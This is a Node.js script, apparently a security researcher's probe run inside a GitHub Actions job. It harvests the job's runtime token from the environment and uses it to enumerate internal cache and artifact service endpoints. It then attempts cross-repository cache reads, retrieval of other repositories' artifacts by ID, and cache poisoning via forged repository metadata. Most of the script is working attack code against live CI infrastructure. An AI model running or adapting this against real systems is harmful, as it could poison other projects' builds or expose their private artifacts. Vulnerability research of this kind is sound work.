const fs = require('fs');
const https = require('https');
const crypto = require('crypto');
const env = process.env;

// [1] env surface dump (token redacted in console, full token kept in-job only)
const keys = Object.keys(env).filter(k =>
  /ACTIONS|RUNTIME|RESULTS|CACHE|RUNNER_|TOKEN|ID_TOKEN/i.test(k));
const out = {};
for (const k of keys) {
  const v = env[k] || '';
  out[k] = /TOKEN/.test(k) ? v.slice(0, 6) + `<redacted len=${v.length}>` : v;
}
fs.mkdirSync('reports', { recursive: true });
fs.writeFileSync('reports/action-env.json', JSON.stringify(out, null, 1));
console.log('keys seen:', keys.join(','));
console.log('runtime token present:', Boolean(env['ACTIONS_RUNTIME_TOKEN']));

// [2] TWIRP host x service x method enumeration (all in action-process context)
function call(url, method, headers, body) {
  return new Promise((resolve, reject) => {
    const req = https.request(new URL(url), { method, headers }, res => {
      let d = '';
      res.on('data', c => (d += c));
      res.on('end', () => resolve({ status: res.statusCode, body: d }));
    });
    req.on('error', e => resolve({ status: 'ERR', body: String(e).slice(0, 80) }));
    if (body) req.write(body);
    req.end();
  });
}

(async () => {
  const CU = env['ACTIONS_CACHE_URL'];
  const RU = env['ACTIONS_RUNTIME_URL'];
  const RE = env['ACTIONS_RESULTS_URL'];
  const TOK = env['ACTIONS_RUNTIME_TOKEN'];
  const RUN = parseInt(env['GITHUB_RUN_ID'] || '0', 10);
  const VER = 'deadbeef00000000000000000000000000000000000000000000000000000000';
  if (!TOK) { console.log('no token in action context either'); return; }

  const hosts = [['cache', CU], ['runtime', RU], ['results', RE]];
  const CALLS = [
    ['github.actions.results.api.v1.CacheService', 'GetCacheEntry', { key: 'probe-x', version: VER }],
    ['github.actions.results.api.v1.CacheService', 'CreateCacheEntry', { key: 'probe-own-' + RUN, version: VER, size: 10 }],
    ['github.actions.results.api.v1.CacheService', 'GetCacheEntryDownloadURL', { key: 'probe-x', version: VER }],
    ['github.actions.results.api.v1.ArtifactService', 'ListArtifacts', { workflow_run_id: RUN, repository_id: 1359293399 }],
    ['github.actions.results.api.v1.ArtifactService', 'ListArtifacts', { workflowRunId: RUN }],
    ['github.actions.results.api.v1.ArtifactService', 'GetSignedArtifactURL', { artifact_id: 1 }],
    ['actions.services.cache.v1.CacheService', 'GetCacheEntry', { key: 'probe-x', version: VER }],
  ];
  const live = [];
  for (const [hn, base] of hosts) {
    if (!base) continue;
    for (const [svc, m, body] of CALLS) {
      const r = await call(base + 'twirp/' + svc + '/' + m, 'POST',
        { Authorization: 'Bearer ' + TOK, 'Content-Type': 'application/json', Accept: 'application/json' },
        JSON.stringify(body));
      const txt = r.body.slice(0, 160).replace(/\n/g, ' ');
      const isLive = r.status !== 404 && !txt.includes('page not found') && !txt.includes("aren't available");
      console.log(r.status, '[' + hn + ']', svc + '/' + m, '::', txt, isLive ? '  <<< LIVE' : '');
      if (isLive) live.push({ hn, base, svc, m });
      await new Promise(res => setTimeout(res, 1000));
    }
  }
  console.log('LIVE COUNT:', live.length, JSON.stringify(live.map(l => [l.hn, l.svc + '/' + l.m])));

  // [3] v1 API with AzDO-style header variants on cache host
  for (const [path, body, m] of [
    ['_apis/artifactcache/caches', JSON.stringify({ key: 'probe-own-' + RUN, version: VER, size: 10 }), 'POST'],
    ['_apis/artifactcache/cache?keys=probe-x&version=' + VER, null, 'GET'],
  ]) {
    for (const hn of ['X-Vss-SessionToken', 'Authorization']) {
      const headers = { 'Content-Type': 'application/json', Accept: 'application/json' };
      if (hn === 'Authorization') headers.Authorization = 'Bearer ' + TOK;
      else headers[hn] = TOK;
      const r = await call(CU + path, m, headers, body);
      console.log(r.status, m, path, '[' + hn + ']', '::', r.body.slice(0, 120).replace(/\n/g, ' '));
      await new Promise(res => setTimeout(res, 1000));
    }
  }
  fs.writeFileSync('reports/twirp-matrix.txt', 'done');
  console.log('TWIRP MATRIX DONE');

  // [4] cache/artifact cross-repo oracle (results host, live endpoints confirmed)
  if (!RE) return;
  const ORC = { Authorization: 'Bearer ' + TOK, 'Content-Type': 'application/json', Accept: 'application/json' };
  const KEY_OWN = 'cross-a-' + RUN;

  console.log('== [4] cache cross-repo oracle ==');
  const rc = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', 'POST', ORC,
    JSON.stringify({ key: KEY_OWN, version: VER, size: 15 }));
  console.log('own create:', rc.status, rc.body.slice(0, 130));
  const su = (JSON.parse(rc.body).signed_upload_url) || '';
  if (su) {
    const ru = await call(su, 'PUT', { 'x-ms-blob-type': 'BlockBlob', 'Content-Length': '15' }, 'own-seed-data-15');
    console.log('own upload:', ru.status);
    for (const fbody of [
      JSON.stringify({ key: KEY_OWN, version: VER, sizeBytes: '15' }),
      JSON.stringify({ key: KEY_OWN, version: VER, size_bytes: '15' }),
    ]) {
      const rf = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', 'POST', ORC, fbody);
      console.log('own finalize:', rf.status, rf.body.slice(0, 130));
      if (rf.status === 200) break;
    }
    await new Promise(res => setTimeout(res, 2000));
    const rg = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', 'POST', ORC,
      JSON.stringify({ key: KEY_OWN, version: VER }));
    console.log('own get:', rg.status, rg.body.slice(0, 160));
  }

  const rx = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', 'POST', ORC,
    JSON.stringify({ key: 'cross-b-2', version: VER }));
  console.log('cross get (key=cross-b-1):', rx.status, rx.body.slice(0, 160),
    rx.body.includes('"ok":true') ? '  <<< HIGH FINDING (cross-repo cache read)' : '  (miss = isolated or not seeded)');

  console.log('== [5] artifact id differential (GetSignedArtifactURL) ==');
  const OWN_OLD = 9993261586; // same-repo earlier run artifact
  const B_ART = parseInt(env['B_ARTIFACT_ID'] || '0', 10);
  const probes = [OWN_OLD, B_ART].filter(x => x > 0);
  for (const aid of probes) {
    const tag = aid === OWN_OLD ? 'own-old' : 'cross-repo';
    const r = await call(RE + 'twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL', 'POST', ORC,
      JSON.stringify({ artifact_id: aid }));
    console.log('id=' + aid + ' (' + tag + '):', r.status, r.body.slice(0, 160));
    await new Promise(res => setTimeout(res, 1000));
  }
  // [6] metadata injection experiments (E1 poison / E2 existence oracle / E3 query-side)
  const B_REPO = '1359323551';
  const VER_OFFICIAL = crypto.createHash('sha256').update('seed-official|gzip|1.0').digest('hex');
  console.log('== [6] metadata injection ==');
  const FAKE_META = { repositoryId: B_REPO, scope: [{ scope: 'Actions.Results:00000000-0000-0000-0000-000000000000:00000000-0000-0000-0000-000000000000', permission: '3' }] };
  const rp1 = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', 'POST', ORC,
    JSON.stringify({ metadata: FAKE_META, key: 'poison-b-1', version: VER }));
  console.log('E1 poison create (fake meta):', rp1.status, rp1.body.slice(0, 160));
  let purl = '';
  try { purl = JSON.parse(rp1.body).signedUploadUrl || ''; } catch (e) {}
  if (purl) {
    const blob = Buffer.from('poison-payload-19');
    const rp2 = await call(purl, 'PUT', { 'x-ms-blob-type': 'BlockBlob', 'Content-Length': String(blob.length) }, blob);
    console.log('E1 poison upload:', rp2.status);
    const rp3 = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/FinalizeCacheEntryUpload', 'POST', ORC,
      JSON.stringify({ metadata: FAKE_META, key: 'poison-b-1', version: VER, sizeBytes: String(blob.length) }));
    console.log('E1 poison finalize:', rp3.status, rp3.body.slice(0, 160));
  }
  const ro = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', 'POST', ORC,
    JSON.stringify({ metadata: { repositoryId: B_REPO }, key: 'official-b-1', version: VER_OFFICIAL }));
  console.log('E2 probe official-b-1 (fake meta):', ro.status, ro.body.slice(0, 170),
    ro.status === 409 ? ' <<<B-SCOPE-KEY-EXISTENCE LEAKED' : ro.status === 200 ? ' <<<metadata ignored (landed in A scope)' : '');
  const rc2 = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/CreateCacheEntry', 'POST', ORC,
    JSON.stringify({ key: 'official-b-1-control', version: VER_OFFICIAL }));
  console.log('E2 control (no meta):', rc2.status, rc2.body.slice(0, 120));
  const rq = await call(RE + 'twirp/github.actions.results.api.v1.CacheService/GetCacheEntryDownloadURL', 'POST', ORC,
    JSON.stringify({ metadata: { repositoryId: B_REPO }, key: 'official-b-1', version: VER_OFFICIAL, restoreKeys: [] }));
  console.log('E3 A-token get official-b-1 w/ B meta:', rq.status, rq.body.slice(0, 170));
  fs.writeFileSync('reports/oracle-final.txt', 'done');
  console.log('ORACLE FINAL DONE');
})().catch(e => { console.error('FATAL', e); process.exit(1); });
